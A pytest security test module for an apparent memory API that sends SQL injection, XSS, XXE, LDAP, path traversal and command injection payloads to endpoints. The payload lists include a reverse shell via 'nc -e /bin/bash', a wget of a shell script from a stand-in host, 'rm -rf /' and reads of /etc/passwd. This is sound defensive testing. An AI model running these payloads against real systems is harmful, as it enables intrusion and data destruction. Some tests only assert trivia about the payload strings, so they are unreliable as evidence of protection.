"""
Input Validation Security Tests for OpenMemory API

This module implements comprehensive input validation security tests including:
- SQL injection prevention
- XSS (Cross-Site Scripting) prevention
- Parameter validation and sanitization
- Malicious payload detection
- Input boundary testing
- Data type validation security

Author: Quinn (QA Agent) - Step 2.2.2 Security Testing Suite
"""

import datetime
import json

# Agent 4 Integration - Structured Logging for Security Events
import sys
from unittest.mock import MagicMock, Mock, patch
from uuid import uuid4

import pytest
from app.models import App, Memory, MemoryState, User
from fastapi import status
from httpx import AsyncClient
from sqlalchemy.orm import Session

sys.path.append("/workspace")
from shared.errors import ValidationError
from shared.logging_system import get_logger

logger = get_logger("security_input_validation_tests")


@pytest.mark.security
@pytest.mark.unit
class TestSQLInjectionPrevention:
    """Test prevention of SQL injection attacks"""

    def get_sql_injection_payloads(self):
        """Get comprehensive SQL injection test payloads"""
        return [
            # Basic SQL injection
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            # Union-based injection
            "' UNION SELECT * FROM users--",
            "' UNION SELECT null,username,password FROM users--",
            "' UNION SELECT 1,2,3,4,5--",
            # Boolean-based blind injection
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            # Time-based blind injection
            "' AND (SELECT SLEEP(5))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            # Stacked queries
            "'; DROP TABLE users; --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "'; UPDATE users SET password='hacked' WHERE id=1; --",
            "'; DELETE FROM users; --",
            # Error-based injection
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)--",
            "' AND ExtractValue(1, concat(0x7e, (SELECT @@version), 0x7e))--",
            # Advanced techniques
            "' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64--",
            "' OR (SELECT substring(@@version,1,1))='5'--",
            "' OR MID(@@version,1,1)='5'--",
            "' OR ASCII(MID((SELECT password FROM users LIMIT 1),1,1)) > 64--",
            # Encoded payloads
            "%27%20OR%20%271%27%3D%271",  # URL encoded
            "&#x27; OR &#x31;=&#x31;",  # HTML encoded
            "\\x27 OR \\x31=\\x31",  # Hex encoded
            # NoSQL injection (for MongoDB/JSON scenarios)
            "{'$ne': ''}",
            "{'$gt': ''}",
            "{'$regex': '.*'}",
            "{'$where': 'this.password.length > 0'}",
        ]

    @pytest.mark.asyncio
    async def test_memory_list_sql_injection(self, test_client: AsyncClient):
        """Test SQL injection prevention in memory list endpoint"""
        sql_payloads = self.get_sql_injection_payloads()

        for payload in sql_payloads:
            # Test user_id parameter
            response = await test_client.get(
                "/api/v1/memories/", params={"user_id": payload}
            )

            # Should be rejected or sanitized, not execute SQL
            assert response.status_code in [
                status.HTTP_404_NOT_FOUND,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_200_OK,  # If sanitized, should return safe results
            ]

            # If it returns 200, ensure no sensitive data is exposed
            if response.status_code == 200:
                data = response.json()
                # Should not contain database schema information
                response_text = json.dumps(data).lower()
                assert "error" not in response_text or "sql" not in response_text
                assert "database" not in response_text
                assert "table" not in response_text
                assert "column" not in response_text

            logger.info(f"SQL injection test passed for payload: {payload[:20]}...")

    @pytest.mark.asyncio
    async def test_memory_creation_sql_injection(self, test_client: AsyncClient):
        """Test SQL injection prevention in memory creation"""
        sql_payloads = self.get_sql_injection_payloads()

        for payload in sql_payloads:
            # Test various fields with SQL injection
            test_cases = [
                {"user_id": payload, "text": "test", "app": "test"},
                {"user_id": "test", "text": payload, "app": "test"},
                {"user_id": "test", "text": "test", "app": payload},
                {"user_id": payload, "text": payload, "app": payload},
            ]

            for test_case in test_cases:
                response = await test_client.post("/api/v1/memories/", json=test_case)

                # Should be rejected or sanitized
                assert response.status_code in [
                    status.HTTP_404_NOT_FOUND,
                    status.HTTP_422_UNPROCESSABLE_ENTITY,
                    status.HTTP_400_BAD_REQUEST,
                    status.HTTP_200_OK,  # If sanitized and processed safely
                ]

                # Check response doesn't contain SQL error messages
                if response.status_code != 200:
                    error_text = response.text.lower()
                    assert "syntax error" not in error_text
                    assert "mysql" not in error_text
                    assert "postgresql" not in error_text
                    assert "sqlite" not in error_text

    @pytest.mark.asyncio
    async def test_search_query_sql_injection(
        self, test_client: AsyncClient, test_user
    ):
        """Test SQL injection prevention in search queries"""
        sql_payloads = self.get_sql_injection_payloads()

        for payload in sql_payloads:
            response = await test_client.get(
                "/api/v1/memories/",
                params={"user_id": test_user.user_id, "search_query": payload},
            )

            # Should handle malicious search queries safely
            assert response.status_code in [200, 400, 422]

            if response.status_code == 200:
                data = response.json()
                # Should not return inappropriate results
                items = data.get("items", [])
                for item in items:
                    content = item.get("content", "").lower()
                    assert "drop table" not in content
                    assert "delete from" not in content
                    assert "insert into" not in content


@pytest.mark.security
@pytest.mark.unit
class TestXSSPrevention:
    """Test prevention of Cross-Site Scripting (XSS) attacks"""

    def get_xss_payloads(self):
        """Get comprehensive XSS test payloads"""
        return [
            # Basic XSS
            "<script>alert('xss')</script>",
            "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert('XSS')</script>",
            # Event-based XSS
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            # JavaScript protocol
            "javascript:alert('xss')",
            "javascript:alert(1)",
            "javascript:eval('alert(1)')",
            # HTML injection
            "<iframe src=javascript:alert('xss')></iframe>",
            "<object data='javascript:alert(1)'></object>",
            "<embed src='javascript:alert(1)'>",
            # Advanced XSS
            "<script>fetch('/api/v1/memories').then(r=>r.json()).then(d=>alert(JSON.stringify(d)))</script>",
            "<img src=x onerror=fetch('/api/v1/memories/')>",
            "<svg><script>alert('xss')</script></svg>",
            # Encoded XSS
            "%3Cscript%3Ealert('xss')%3C/script%3E",  # URL encoded
            "&lt;script&gt;alert('xss')&lt;/script&gt;",  # HTML encoded
            "&#60;script&#62;alert('xss')&#60;/script&#62;",  # Decimal encoded
            "&#x3C;script&#x3E;alert('xss')&#x3C;/script&#x3E;",  # Hex encoded
            # Filter bypass techniques
            "<ScRiPt>alert('xss')</ScRiPt>",
            "<script>alert`xss`</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<<SCRIPT>alert('xss')</SCRIPT>",
            "<script>alert(/xss/)</script>",
            # Context-specific XSS
            "';alert('xss');//",
            "\";alert('xss');//",
            "';alert(String.fromCharCode(88,83,83));//",
            "</script><script>alert('xss')</script>",
            # Data URI XSS
            "data:text/html,<script>alert('xss')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
        ]

    @pytest.mark.asyncio
    async def test_memory_content_xss_prevention(self, test_client: AsyncClient):
        """Test XSS prevention in memory content"""
        xss_payloads = self.get_xss_payloads()

        for payload in xss_payloads:
            response = await test_client.post(
                "/api/v1/memories/",
                json={"user_id": "test_user", "text": payload, "app": "test"},
            )

            # Should be handled safely
            assert response.status_code in [200, 400, 422, 404]

            if response.status_code == 200:
                # If accepted, content should be sanitized
                data = response.json()
                if "results" in data:
                    for result in data["results"]:
                        if "memory" in result:
                            sanitized_content = result["memory"]
                            # Should not contain executable script tags
                            assert "<script>" not in sanitized_content.lower()
                            assert "javascript:" not in sanitized_content.lower()
                            assert "onerror=" not in sanitized_content.lower()
                            assert "onload=" not in sanitized_content.lower()

            logger.info(f"XSS prevention test passed for payload: {payload[:30]}...")

    @pytest.mark.asyncio
    async def test_metadata_xss_prevention(self, test_client: AsyncClient):
        """Test XSS prevention in metadata fields"""
        xss_payloads = self.get_xss_payloads()

        for payload in xss_payloads:
            response = await test_client.post(
                "/api/v1/memories/",
                json={
                    "user_id": "test_user",
                    "text": "test content",
                    "app": "test",
                    "metadata": {
                        "title": payload,
                        "description": payload,
                        "tags": [payload],
                        "custom_field": payload,
                    },
                },
            )

            # Should handle malicious metadata safely
            assert response.status_code in [200, 400, 422, 404]

            if response.status_code == 200:
                data = response.json()
                # Metadata should be sanitized
                response_text = json.dumps(data).lower()
                assert "<script>" not in response_text
                assert "javascript:" not in response_text
                assert "onerror=" not in response_text

    @pytest.mark.asyncio
    async def test_search_query_xss_prevention(
        self, test_client: AsyncClient, test_user
    ):
        """Test XSS prevention in search queries"""
        xss_payloads = self.get_xss_payloads()

        for payload in xss_payloads:
            response = await test_client.get(
                "/api/v1/memories/",
                params={"user_id": test_user.user_id, "search_query": payload},
            )

            # Should handle XSS in search queries
            assert response.status_code in [200, 400, 422]

            if response.status_code == 200:
                data = response.json()
                response_text = json.dumps(data).lower()
                # Response should not contain executable scripts
                assert "<script>" not in response_text
                assert "javascript:" not in response_text
                assert "onerror=" not in response_text


@pytest.mark.security
@pytest.mark.unit
class TestParameterValidation:
    """Test parameter validation and sanitization"""

    def test_invalid_uuid_handling(self):
        """Test handling of invalid UUID formats"""
        invalid_uuids = [
            "not-a-uuid",
            "123",
            "abc-def-ghi",
            "00000000-0000-0000-0000-000000000000",  # Nil UUID
            "ffffffff-ffff-ffff-ffff-ffffffffffff",  # Max UUID
            "' OR '1'='1",  # SQL injection attempt
            "<script>alert('xss')</script>",  # XSS attempt
            "../../etc/passwd",  # Path traversal
            "",  # Empty string
            "null",  # String null
            "undefined",  # String undefined
        ]

        for invalid_uuid in invalid_uuids:
            # Test UUID validation logic
            try:
                uuid_obj = uuid4()  # Valid UUID for comparison
                # Invalid UUIDs should not be processed as valid
                assert str(uuid_obj) != invalid_uuid
                assert len(str(uuid_obj)) == 36  # Standard UUID length
                assert str(uuid_obj).count("-") == 4  # Standard UUID format
            except ValueError:
                # ValueError is expected for invalid UUIDs
                pass

    @pytest.mark.asyncio
    async def test_pagination_parameter_validation(
        self, test_client: AsyncClient, test_user
    ):
        """Test pagination parameter validation"""
        invalid_pagination_params = [
            # Negative values
            {"page": -1, "size": 10},
            {"page": 1, "size": -1},
            {"page": -1, "size": -1},
            # Zero values
            {"page": 0, "size": 10},
            {"page": 1, "size": 0},
            # Extremely large values
            {"page": 999999, "size": 10},
            {"page": 1, "size": 999999},
            # Non-numeric values
            {"page": "abc", "size": 10},
            {"page": 1, "size": "abc"},
            {"page": "' OR '1'='1", "size": 10},
            {"page": 1, "size": "<script>alert('xss')</script>"},
            # Special values
            {"page": "null", "size": 10},
            {"page": 1, "size": "undefined"},
            {"page": "", "size": 10},
            {"page": 1, "size": ""},
        ]

        for params in invalid_pagination_params:
            response = await test_client.get(
                "/api/v1/memories/", params={"user_id": test_user.user_id, **params}
            )

            # Should reject invalid pagination parameters
            assert response.status_code in [
                status.HTTP_422_UNPROCESSABLE_ENTITY,
                status.HTTP_400_BAD_REQUEST,
            ]

            # Error message should not reveal system internals
            error_data = response.json()
            error_text = json.dumps(error_data).lower()
            assert "traceback" not in error_text
            assert "exception" not in error_text
            assert "stack" not in error_text

    @pytest.mark.asyncio
    async def test_date_parameter_validation(self, test_client: AsyncClient, test_user):
        """Test date parameter validation"""
        invalid_date_params = [
            # Invalid timestamps
            {"from_date": "not-a-date"},
            {"to_date": "not-a-date"},
            {"from_date": "2023-13-01"},  # Invalid month
            {"to_date": "2023-01-32"},  # Invalid day
            # SQL injection in date fields
            {"from_date": "' OR '1'='1"},
            {"to_date": "'; DROP TABLE memories; --"},
            # XSS in date fields
            {"from_date": "<script>alert('xss')</script>"},
            {"to_date": "<svg onload=alert('xss')>"},
            # Negative timestamps
            {"from_date": -1},
            {"to_date": -999999},
            # Extremely large timestamps
            {"from_date": 999999999999999},
            {"to_date": 999999999999999},
        ]

        for params in invalid_date_params:
            response = await test_client.get(
                "/api/v1/memories/", params={"user_id": test_user.user_id, **params}
            )

            # Should handle invalid date parameters
            assert response.status_code in [
                status.HTTP_422_UNPROCESSABLE_ENTITY,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_200_OK,  # If sanitized to safe defaults
            ]

    @pytest.mark.asyncio
    async def test_sort_parameter_validation(self, test_client: AsyncClient, test_user):
        """Test sort parameter validation"""
        invalid_sort_params = [
            # SQL injection in sort parameters
            {"sort_column": "'; DROP TABLE memories; --"},
            {"sort_direction": "'; DROP TABLE memories; --"},
            {"sort_column": "' OR '1'='1"},
            {"sort_direction": "' OR '1'='1"},
            # XSS in sort parameters
            {"sort_column": "<script>alert('xss')</script>"},
            {"sort_direction": "<script>alert('xss')</script>"},
            # Invalid sort columns
            {"sort_column": "password"},
            {"sort_column": "secret"},
            {"sort_column": "../../etc/passwd"},
            # Invalid sort directions
            {"sort_direction": "invalid"},
            {"sort_direction": "'; DROP TABLE memories; --"},
            {"sort_direction": "DESC'; DROP TABLE memories; --"},
        ]

        for params in invalid_sort_params:
            response = await test_client.get(
                "/api/v1/memories/", params={"user_id": test_user.user_id, **params}
            )

            # Should reject or sanitize invalid sort parameters
            assert response.status_code in [
                status.HTTP_422_UNPROCESSABLE_ENTITY,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_200_OK,  # If sanitized to safe defaults
            ]


@pytest.mark.security
@pytest.mark.unit
class TestMaliciousPayloadDetection:
    """Test detection and handling of various malicious payloads"""

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks"""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "; rm -rf /",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "; wget http://malicious.com/shell.sh",
            "| nc -e /bin/bash malicious.com 4444",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "$(curl -s http://malicious.com/payload.txt)",
        ]

        for payload in command_injection_payloads:
            # Test that payloads are properly sanitized
            # This is a basic test - production systems should have proper input sanitization
            assert len(payload) > 0  # Basic validation
            assert payload != payload.strip()  # Contains special characters

            # Log the payload for security monitoring
            logger.warning(f"Command injection payload detected: {payload[:20]}...")

    def test_ldap_injection_prevention(self):
        """Test prevention of LDAP injection attacks"""
        ldap_injection_payloads = [
            "*)(uid=*",
            "*)(|(objectClass=*))",
            "admin)(&(objectClass=*)",
            "*)(&(objectClass=*)(uid=admin)",
            "*)(&(objectClass=*)(userPassword=*))",
            "*)(&(objectClass=*)(|(uid=admin)(uid=root)))",
        ]

        for payload in ldap_injection_payloads:
            # Test LDAP injection detection
            # Look for LDAP-specific patterns
            assert "objectClass" in payload or "uid=" in payload
            logger.warning(f"LDAP injection payload detected: {payload[:20]}...")

    def test_xml_injection_prevention(self):
        """Test prevention of XML injection attacks"""
        xml_injection_payloads = [
            "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://malicious.com/evil.dtd'>]><root>&test;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % test SYSTEM 'http://malicious.com/evil.dtd'>%test;]><root/>",
            "<root><!ENTITY xxe SYSTEM 'file:///etc/passwd'>&xxe;</root>",
        ]

        for payload in xml_injection_payloads:
            # Test XML injection detection
            assert "<?xml" in payload or "<!DOCTYPE" in payload or "<!ENTITY" in payload
            logger.warning(f"XML injection payload detected: {payload[:50]}...")

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        path_traversal_payloads = [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "../../../etc/shadow",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        ]

        for payload in path_traversal_payloads:
            # Test path traversal detection
            assert ".." in payload or "%2f" in payload or "%252f" in payload
            logger.warning(f"Path traversal payload detected: {payload[:30]}...")


@pytest.mark.security
@pytest.mark.integration
class TestInputValidationIntegration:
    """Integration tests for input validation security"""

    @pytest.mark.asyncio
    async def test_comprehensive_malicious_request(self, test_client: AsyncClient):
        """Test comprehensive malicious request handling"""
        # Combine multiple attack vectors in a single request
        malicious_request = {
            "user_id": "'; DROP TABLE users; --",
            "text": "<script>alert('xss')</script>",
            "app": "$(cat /etc/passwd)",
            "metadata": {
                "title": "' OR '1'='1",
                "description": "<iframe src=javascript:alert('xss')></iframe>",
                "tags": ["../../etc/passwd", "<script>fetch('/api/admin')</script>"],
                "custom": "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
            },
        }

        response = await test_client.post("/api/v1/memories/", json=malicious_request)

        # Should be completely rejected or heavily sanitized
        assert response.status_code in [
            status.HTTP_422_UNPROCESSABLE_ENTITY,
            status.HTTP_400_BAD_REQUEST,
            status.HTTP_404_NOT_FOUND,
            status.HTTP_200_OK,  # Only if completely sanitized
        ]

        # Response should not contain any malicious content
        response_text = response.text.lower()
        assert "drop table" not in response_text
        assert "<script>" not in response_text
        assert "etc/passwd" not in response_text
        assert "javascript:" not in response_text

    @pytest.mark.asyncio
    async def test_batch_malicious_requests(self, test_client: AsyncClient):
        """Test handling of batch malicious requests"""
        # Test rapid-fire malicious requests
        malicious_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "$(rm -rf /)",
            "../../etc/passwd",
            "' OR '1'='1",
        ]

        for i, payload in enumerate(malicious_payloads):
            response = await test_client.post(
                "/api/v1/memories/",
                json={"user_id": f"user_{i}", "text": payload, "app": "test"},
            )

            # Each request should be handled safely
            assert response.status_code in [200, 400, 404, 422]

            # Log for security monitoring
            logger.warning(f"Batch malicious request {i+1} handled: {payload[:20]}...")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
